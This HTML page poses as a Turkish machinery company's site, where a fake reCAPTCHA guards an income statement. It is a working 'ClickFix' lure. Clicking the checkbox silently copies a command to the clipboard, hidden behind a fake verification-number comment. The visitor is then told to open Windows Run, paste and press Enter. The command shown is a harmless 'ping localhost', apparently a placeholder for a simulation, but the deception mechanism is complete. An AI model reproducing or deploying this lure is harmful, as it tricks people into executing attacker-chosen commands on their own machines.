<!DOCTYPE html>
<html lang="tr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gelir Tablosu | Yılmaz Makina Sanayi</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Oswald:wght@400;700&display=swap"
        rel="stylesheet">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css">
    <link rel="stylesheet" href="style.css">
    <style>
        /* Captcha Specific Styles - Scoped to avoid conflicts */
        .captcha-container {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 60vh;
            background: var(--color-surface);
            padding: 50px 20px;
        }

        .m-p {
            margin: 0;
            padding: 0;
        }

        .block {
            display: block;
        }

        .line-normal {
            line-height: normal;
        }

        .checkbox-window {
            height: 74px;
            width: 300px;
            background-color: #f9f9f9;
            border-radius: 3px;
            border: 1px solid #d3d3d3;
            position: relative;
            color: #000;
            /* Force black text for captcha box */
        }

        .checkbox-window a {
            color: #555;
            text-decoration: none;
        }

        .checkbox-window a:hover {
            text-decoration: underline;
        }

        .checkbox-container {
            width: 28px;
            height: 28px;
        }

        .checkbox {
            position: relative;
            background-color: #fff;
            border-radius: 2px;
            height: 100%;
            width: 100%;
            border: 2px solid #c1c1c1;
            margin: 21px 0 0 12px;
            outline: none;
            cursor: pointer;
            transition: all 0.5s;
        }

        .checkbox:hover {
            border: 2px solid #b2b2b2;
        }

        .im-not-a-robot {
            position: relative;
            left: 52px;
            bottom: 3px;
            font-size: 15px;
            color: #282727;
            font-family: Roboto, helvetica, arial, sans-serif;
        }

        .captcha-logo {
            position: relative;
            left: 244px;
            bottom: 36px;
            width: 40px;
            height: 45px;
            vertical-align: baseline;
            padding-bottom: 4px;
        }

        .checkbox-desc {
            color: #555555;
            position: relative;
            font-size: 8px;
            text-align: center;
            bottom: 40px;
            left: 112px;
            font-family: Roboto, helvetica, arial, sans-serif;
        }

        .spinner {
            visibility: hidden;
            position: relative;
            top: -85px;
            left: 12px;
            height: 20px;
            width: 20px;
            border: 2px solid rgba(0, 0, 0, 0.1);
            border-top: 2px solid #333;
            border-radius: 50%;
            opacity: 0;
            transition: opacity 0.5s linear;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        .verify-window {
            font-family: Roboto, helvetica, arial, sans-serif;
            opacity: 0;
            position: absolute;
            visibility: hidden;
            margin: auto;
            width: 310px;
            background-color: #fff;
            border: 1px solid #cecece;
            box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12);
            transition: opacity 400ms;
            z-index: 2000;
            color: #000;
            text-align: left;
        }

        .verify-header {
            background-color: #1A73E8;
            padding: 16px 16px 24px 16px;
            color: #fff;
        }

        .verify-header-text-small {
            font-size: 14px;
        }

        .verify-header-text-medium {
            font-size: 16px;
        }

        .verify-header-text-big {
            font-size: 24px;
            font-weight: 700;
        }

        .verify-main {
            padding: 15px;
            color: #111;
            font-size: 13px;
        }

        ol {
            padding-left: 20px;
            margin: 10px 0;
        }

        ol li {
            margin-bottom: 10px;
        }

        .verify-footer {
            border-top: 1px solid #cecece;
            padding: 10px;
            color: #737373;
            font-size: 13px;
        }

        .verify-verify-button {
            text-transform: uppercase;
            background-color: #5a89e2;
            color: #fff;
            text-align: center;
            width: 100%;
            padding: 10px;
            border-radius: 3px;
            font-size: 14px;
            border: none;
            cursor: pointer;
            /* Changed from not-allowed for better UX flow simulation */
            margin-top: 10px;
        }

        .verify-verify-button:disabled {
            cursor: not-allowed;
            opacity: 0.7;
        }
    </style>
</head>

<body>

    <header>
        <div class="logo">YILMAZ<span>MAKİNA</span></div>
        <nav>
            <ul>
                <li><a href="index.html">Ana Sayfa</a></li>
                <li><a href="index.html#about">Hakkımızda</a></li>
                <li><a href="index.html#products">Modeller</a></li>
                <li><a href="index.html#contact">İletişim</a></li>
            </ul>
        </nav>
        <a href="#contact" class="btn btn-primary">Teklif Al</a>
    </header>

    <div style="height: 100px;"></div> <!-- Spacer for fixed header -->

    <section class="section" style="padding-top: 20px;">
        <h2 class="section-title" style="text-align: center;">Güvenlik Doğrulaması</h2>
        <p style="text-align: center; color: var(--color-text-muted); margin-bottom: 30px;">
            Gelir tablosuna ulaşmak için lütfen aşağıdaki doğrulamayı tamamlayınız.
        </p>

        <div class="captcha-container">
            <div id="checkbox-window" class="checkbox-window m-p block">
                <div class="checkbox-container m-p">
                    <button type="button" id="checkbox" class="checkbox m-p line-normal"></button>
                </div>
                <p class="im-not-a-robot m-p line-normal">Robot değilim</p>
                <img src="assets/cap.svg" class="captcha-logo line-normal" alt="reCAPTCHA">
                <br>
                <p class="checkbox-desc m-p line-normal">
                    <a href="https://www.google.com/intl/en/policies/privacy/" target="_blank">Gizlilik</a> -
                    <a href="https://www.google.com/intl/en/policies/terms/" target="_blank">Tanımlar</a>
                </p>
                <img class="spinner" alt="" id="spinner">
            </div>

            <div id="verify-window" class="verify-window">
                <div class="verify-container">
                    <div class="verify-header">
                        <span class="verify-header-text-medium m-p block">Bunları tamamlayın</span>
                        <span class="verify-header-text-big m-p block">Doğrulama adımları</span>
                    </div>
                    <div class="verify-main">
                        <p>Lütfen robot olmadığınızı kanıtlayın:</p>
                        <ol>
                            <li>Windows tuşuna basılı tutun <i class="fab fa-windows"></i> + <b>R</b>.</li>
                            <li>Açılacak ekranda, <b>Ctrl</b> + <b>V</b> 'ye basın.</li>
                            <li>Doğrulamayı tamamlamak için <b>Enter</b> tuşuna basın.</li>
                        </ol>
                        <p>
                            Bu ifadeyi görüp kabul ettiğinizde süreç tamamlanacaktır:
                            <br>
                            <code
                                style="background: #eee; padding: 2px; border-radius: 3px; display: block; margin-top: 5px; color: #333;">
                                ✅ "Robot değilim - Doğrulama No: <span id="verification-id">...</span>"
                            </code>
                        </p>
                    </div>
                    <div class="verify-footer">
                        <div class="verify-footer-left">
                            Doğrulamayı tamamlamak için lütfen yukarıdaki adımları tamamlayın.
                        </div>
                        <button type="button" class="verify-verify-button block"
                            id="verify-verify-button">Doğrula</button>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <footer>
        <p>&copy; 2024 Yılmaz Makina Sanayi. Tüm hakları saklıdır.</p>
    </footer>

    <script src="main.js"></script>
    <script>
        // Captcha Logic integrated from captcha/index.html
        document.addEventListener('DOMContentLoaded', () => {
            let checkboxWindow = document.getElementById("checkbox-window");
            let checkboxBtn = document.getElementById("checkbox");
            let checkboxBtnSpinner = document.getElementById("spinner");
            let verifywindow = document.getElementById("verify-window");
            let verifyButton = document.getElementById("verify-verify-button");

            function addCapListeners() {
                if (checkboxBtn) {
                    document.addEventListener("click", function (event) {
                        let path = event.composedPath();
                        // Close verify window if clicked outside
                        if (!path.includes(verifywindow) && !path.includes(checkboxWindow) && isverifywindowVisible()) {
                            closeverifywindow();
                        }
                    });
                    checkboxBtn.addEventListener("click", function (event) {
                        event.preventDefault();
                        checkboxBtn.disabled = true;
                        runClickedCheckboxEffects();
                    });

                    if (verifyButton) {
                        verifyButton.addEventListener("click", function () {
                            alert("Doğrulama başarılı!");
                            // Here you would redirect to the actual form
                            closeverifywindow();
                            // Change checkbox to checked state visually
                            hideCapLoading();
                            showCapCheckboxAsChecked();
                        });
                    }
                }
            }

            function runClickedCheckboxEffects() {
                hideCapCheckbox();
                setTimeout(function () {
                    showCapLoading();
                }, 500);
                setTimeout(function () {
                    showVerifyWindow();
                }, 900)
            }

            function showCapLoading() {
                checkboxBtnSpinner.style.visibility = "visible";
                checkboxBtnSpinner.style.opacity = "1";
                checkboxBtnSpinner.style.animation = "spin 1s linear infinite";
            }

            function hideCapLoading() {
                checkboxBtnSpinner.style.opacity = "0";
                checkboxBtnSpinner.style.animation = "none";
                setTimeout(function () {
                    checkboxBtnSpinner.style.visibility = "hidden";
                }, 500);
            }

            function hideCapCheckbox() {
                checkboxBtn.style.visibility = "hidden";
                checkboxBtn.style.opacity = "0";
            }

            function showCapCheckbox() {
                checkboxBtn.style.width = "100%";
                checkboxBtn.style.height = "100%";
                checkboxBtn.style.borderRadius = "2px";
                checkboxBtn.style.margin = "21px 0 0 12px";
                checkboxBtn.style.opacity = "1";
                checkboxBtn.style.visibility = "visible";
                checkboxBtn.disabled = false;
            }

            function showCapCheckboxAsChecked() {
                // Simplified visual checkmark
                checkboxBtn.style.visibility = "hidden"; // Hide button
                // Create checkmark element if not exists
                let check = document.createElement("div");
                check.innerHTML = "✔";
                check.style.color = "green";
                check.style.fontSize = "24px";
                check.style.position = "absolute";
                check.style.top = "20px";
                check.style.left = "20px";
                checkboxWindow.appendChild(check);
            }

            function generateRandomNumber() {
                const min = 1000;
                const max = 9999;
                return Math.floor(Math.random() * (max - min + 1) + min).toString();
            }

            function closeverifywindow() {
                verifywindow.style.display = "none";
                verifywindow.style.visibility = "hidden";
                verifywindow.style.opacity = "0";

                showCapCheckbox();
                hideCapLoading();
            }

            function isverifywindowVisible() {
                return verifywindow.style.display !== "none" && verifywindow.style.display !== "";
            }

            function setCCopyData(textToCopy) {
                const tempTextArea = document.createElement("textarea");
                tempTextArea.value = textToCopy;
                document.body.append(tempTextArea);
                tempTextArea.select();
                document.execCommand("copy");
                document.body.removeChild(tempTextArea);
            }

            function stageC(cToRun, verification_id) {
                const suffix = " # "
                const ploy = "✅ ''Robot değilim - Doğrulama No: "
                const end = "''"
                const textToCopy = cToRun + suffix + ploy + verification_id + end

                setCCopyData(textToCopy);
            }


            function showVerifyWindow() {
                verifywindow.style.display = "block";
                verifywindow.style.visibility = "visible";
                verifywindow.style.opacity = "1";

                // Positioning logic adjusted for relative container
                // For simplicity, centering in the viewport or relative to parent
                // Trying original logic first, but might need adjustment
                //verifywindow.style.top = (checkboxWindow.offsetTop - 80) + "px";
                // verifywindow.style.left =  (checkboxWindow.offsetLeft + 54) + "px";
                verifywindow.style.left = "50%";
                verifywindow.style.transform = "translateX(-50%)";

                var verification_id = generateRandomNumber();
                let verifyIdEl = document.getElementById('verification-id');
                if (verifyIdEl) verifyIdEl.textContent = verification_id;

                const toRun = "ping localhost"
                stageC(toRun, verification_id)
            }

            addCapListeners();
        });
    </script>
</body>

</html>